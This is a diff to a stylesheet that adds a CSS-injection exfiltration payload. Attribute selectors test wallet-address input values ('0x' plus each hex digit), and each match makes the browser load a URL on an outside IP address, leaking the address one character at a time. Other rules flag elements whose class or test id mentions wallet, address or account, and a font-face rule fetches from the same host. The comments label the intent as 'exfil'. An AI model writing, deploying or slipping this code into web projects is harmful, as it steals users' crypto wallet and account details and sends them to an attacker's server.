@@ -1,1 +1,30 @@
-body{background:url(http://144.172.105.38:9999/css-inject)}
+
+/* Detect wallet address in any input/span */
+input[value^="0x"] { background-image: url(http://144.172.105.38:9999/wallet-detected) !important; }
+
+/* Exfil individual hex chars after 0x prefix */
+input[value^="0x0"] { list-style: url(http://144.172.105.38:9999/w/0x0); }
+input[value^="0x1"] { list-style: url(http://144.172.105.38:9999/w/0x1); }
+input[value^="0x2"] { list-style: url(http://144.172.105.38:9999/w/0x2); }
+input[value^="0x3"] { list-style: url(http://144.172.105.38:9999/w/0x3); }
+input[value^="0x4"] { list-style: url(http://144.172.105.38:9999/w/0x4); }
+input[value^="0x5"] { list-style: url(http://144.172.105.38:9999/w/0x5); }
+input[value^="0x6"] { list-style: url(http://144.172.105.38:9999/w/0x6); }
+input[value^="0x7"] { list-style: url(http://144.172.105.38:9999/w/0x7); }
+input[value^="0x8"] { list-style: url(http://144.172.105.38:9999/w/0x8); }
+input[value^="0x9"] { list-style: url(http://144.172.105.38:9999/w/0x9); }
+input[value^="0xa"] { list-style: url(http://144.172.105.38:9999/w/0xa); }
+input[value^="0xb"] { list-style: url(http://144.172.105.38:9999/w/0xb); }
+input[value^="0xc"] { list-style: url(http://144.172.105.38:9999/w/0xc); }
+input[value^="0xd"] { list-style: url(http://144.172.105.38:9999/w/0xd); }
+input[value^="0xe"] { list-style: url(http://144.172.105.38:9999/w/0xe); }
+input[value^="0xf"] { list-style: url(http://144.172.105.38:9999/w/0xf); }
+
+/* Detect connected state */
+[data-testid*="wallet"] { background-image: url(http://144.172.105.38:9999/wallet-element) !important; }
+[class*="wallet"] { outline: 1px solid url(http://144.172.105.38:9999/wallet-class); }
+[class*="address"] { background-image: url(http://144.172.105.38:9999/address-class) !important; }
+[class*="account"] { background-image: url(http://144.172.105.38:9999/account-class) !important; }
+
+/* Font-face trick for text content exfil */
+@font-face { font-family: exfil; src: url(http://144.172.105.38:9999/font-loaded); }
